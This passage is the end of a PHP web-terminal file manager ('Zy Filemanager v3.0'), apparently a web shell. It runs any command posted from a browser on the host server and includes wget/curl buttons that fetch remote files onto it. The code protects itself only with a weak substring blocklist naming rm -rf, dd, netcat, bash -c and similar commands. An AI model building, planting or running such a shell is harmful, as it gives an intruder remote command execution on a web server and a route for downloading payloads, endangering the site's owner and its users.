            <button type="button" onclick="insertCommand('pwd')" class="action-btn">pwd</button>
            <button type="button" onclick="insertCommand('ls -la')" class="action-btn">ls -la</button>
            <button type="button" onclick="insertCommand('whoami')" class="action-btn">whoami</button>
            <button type="button" onclick="insertCommand('df -h')" class="action-btn">df -h</button>
            <button type="button" onclick="insertCommand('mkdir newfolder')" class="action-btn">mkdir</button>
            <button type="button" onclick="clearTerminal()" class="action-btn">Clear</button>
        </div>
    </form>
    
    <?php if (isset($_POST['cmd']) && !empty(trim($_POST['cmd']))): ?>
    <div class="terminal-output" id="terminalOutput">
        <div style="color: #00ccff;">$ <?php echo htmlspecialchars(trim($_POST['cmd'])); ?></div>
        <div style="margin-top:10px;">
            <?php
            $cmd = trim($_POST['cmd']);
            
            // Security check - block dangerous commands
            $dangerous_commands = [
                'rm -rf', 'mkfs', 'dd', '> /dev/', 'bash -c', 'sh -c',
                'python -c', 'perl -e', 'php -r', 'nc ', 'netcat',
                'chmod 777', 'chown', 'iptables', 'ufw'
            ];
            
            $blocked = false;
            foreach ($dangerous_commands as $danger) {
                if (stripos($cmd, $danger) !== false) {
                    echo '<span style="color:#ff4444;">❌ Command blocked for security: ' . htmlspecialchars($danger) . '</span>';
                    $blocked = true;
                    break;
                }
            }
            
            if (!$blocked) {
                $output = safe_execute_command($cmd, $path);
                if (!empty($output)) {
                    $output = htmlspecialchars($output);
                    // Add color highlighting
                    $output = preg_replace('/\b(error|fail|denied|permission|failed|cannot)\b/i', '<span style="color:#ff4444;font-weight:bold;">$0</span>', $output);
                    $output = preg_replace('/\b(success|ok|done|downloaded|saved)\b/i', '<span style="color:#00ff88;font-weight:bold;">$0</span>', $output);
                    $output = preg_replace('/\b(warning|notice)\b/i', '<span style="color:#ffff00;font-weight:bold;">$0</span>', $output);
                    echo nl2br($output);
                } else {
                    echo '<span style="color:#888;">[Command executed - No output]</span>';
                }
            }
            ?>
        </div>
    </div>
    <?php endif; ?>
</div>

<!-- Footer -->
<div class="footer">
    <p>Zy Filemanager v3.0 | WGET/CURL Enabled | Download Support</p>
    <p style="font-size:12px;margin-top:5px;">
        PHP: <?php echo phpversion(); ?> | 
        Path: <?php echo htmlspecialchars($path); ?> |
        Memory: <?php echo formatSize(memory_get_usage(true)); ?>
    </p>
</div>

<script>
// JavaScript functions
function insertCommand(cmd) {
    document.getElementById('cmdInput').value = cmd;
    document.getElementById('cmdInput').focus();
}

function clearTerminal() {
    const output = document.getElementById('terminalOutput');
    if (output) output.innerHTML = '';
}

function quickDownload(form, type) {
    event.preventDefault();
    const url = form.querySelector('input[name="url"]').value;
    const filename = form.querySelector('input[name="filename"]').value;
    
    if (!url) {
        alert('Please enter a URL');
        return false;
    }
    
    let cmd;
    if (type === 'wget') {
        cmd = 'wget -O ' + (filename || 'downloaded_file') + ' ' + url;
    } else {
        cmd = 'curl -o ' + (filename || 'downloaded_file') + ' ' + url;
    }
    
    document.getElementById('cmdInput').value = cmd;
    document.querySelector('form[method="post"]').submit();
    return false;
}

// Auto-scroll terminal
const terminalOutput = document.getElementById('terminalOutput');
if (terminalOutput) {
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

// Prevent form resubmission
if (window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Ctrl+S in editor
    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
        const textarea = document.querySelector('textarea[name="content"]');
        if (textarea) {
            e.preventDefault();
            textarea.closest('form').submit();
        }
    }
    
    // Ctrl+L to clear terminal
    if ((e.ctrlKey || e.metaKey) && e.key === 'l') {
        e.preventDefault();
        clearTerminal();
    }
    
    // Ctrl+D to focus download
    if ((e.ctrlKey || e.metaKey) && e.key === 'd') {
        e.preventDefault();
        const urlInput = document.querySelector('input[name="url"]');
        if (urlInput) urlInput.focus();
    }
});

// Example download buttons
document.addEventListener('DOMContentLoaded', function() {
    // Add some example download buttons
    const terminalHeader = document.querySelector('.terminal-header');
    if (terminalHeader) {
        const examplesDiv = document.createElement('div');
        examplesDiv.style.marginTop = '10px';
        examplesDiv.style.fontSize = '12px';
        examplesDiv.innerHTML = `
            <div style="display:flex;gap:5px;flex-wrap:wrap;margin-top:5px;">
                <span style="color:#888;">Examples:</span>
                <button onclick="insertCommand('wget -O phpinfo.php https://raw.githubusercontent.com/php/php-src/master/php.ini-production')" class="action-btn" style="font-size:11px;">Download php.ini</button>
                <button onclick="insertCommand('curl -o index.html https://raw.githubusercontent.com/electron/electron/master/README.md')" class="action-btn" style="font-size:11px;">Download README</button>
            </div>
        `;
        terminalHeader.parentNode.insertBefore(examplesDiv, terminalHeader.nextSibling);
    }
});
</script>

</body>
</html>
<?php
ob_end_flush();
?>
